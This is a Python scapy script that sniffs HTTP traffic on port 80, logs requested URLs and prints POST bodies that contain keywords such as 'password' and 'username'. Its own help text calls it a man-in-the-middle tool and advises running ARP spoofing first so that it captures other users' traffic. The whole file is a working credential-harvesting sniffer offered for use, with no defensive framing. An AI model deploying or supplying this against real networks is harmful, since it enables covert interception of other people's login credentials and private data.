import asyncio

from scapy.all import *
from scapy.layers.http import HTTPRequest, HTTPResponse, HTTP# import HTTP pack
from colorama import init, Fore
# initialize colorama
init()
# define colors
GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET



def sniff_packets(iface=None):
    """
    Sniff 80 port packets with `iface`, if None (default), then the
    Scapy's default interface is used
    
    """
    if iface:
        # port 80 for http (generally)
        # `process_packet` is the callback
        
          sniff(filter="port 80",prn=process_packet, iface=iface, store=False, count=100)
    else:
        # sniff with default interface
          sniff(filter="port 80",prn=process_packet, iface=iface, store=False,count=100)

def process_packet(packet):

    packet_len = len(packet)

    dst_ip = packet[IP].dst
    src_ip = packet[IP].src

    if packet.haslayer(TCP):
        if packet.haslayer(HTTP):
            protocol = "HTTP"
            if packet.haslayer(HTTPRequest):
                url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
            #     # get the requester's IP Address
            #     # get the request method
                method = packet[HTTPRequest].Method.decode()
                version = packet[HTTPRequest].Http_Version.decode()
                payload = method+" "+url+" "+version
                
                print(f"\n{GREEN}[+] {src_ip} Requested {url} with {method} {protocol} {version} {RESET}")
                # return [src_ip,protocol,packet_len,payload]

                if packet.haslayer(Raw) and method == "POST":
                    postedData = str(packet[Raw].load)
                    keywords = ["login", "password", "username", "user", "pass"]
                    for keyword in keywords:
                        if keyword in postedData:
                            credentials = "&".join(postedData.split("&",2)[:2])
                        payload+=postedData
                        print(f"\n{RED}[*] Some useful Raw data: {postedData}{RESET}")

                # print([src_ip,dst_ip,protocol,packet_len,payload,credentials])
            
            elif packet.haslayer(HTTPResponse):
                code = packet[HTTPResponse].Status_Code.decode()
                reason_phrase = packet[HTTPResponse].Reason_Phrase.decode()
                version = packet[HTTPResponse].Http_Version.decode()
                payload = code+" "+reason_phrase+" "+version 
                



async def main(iface):
    print("Starting caputre")
    task =  asyncio.create_task(printer())
    # await asyncio.sleep(2)    

    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, sniff_packets,iface )

    print('\n Finished caputure: ')


async def printer():
    print('\n Still nothing... ')
    await asyncio.sleep(20)   

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
                                                 + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")
    # parse arguments
    args = parser.parse_args()
    iface = args.iface
    show_raw = args.show_raw
    # main()    
    asyncio.run(main(iface))
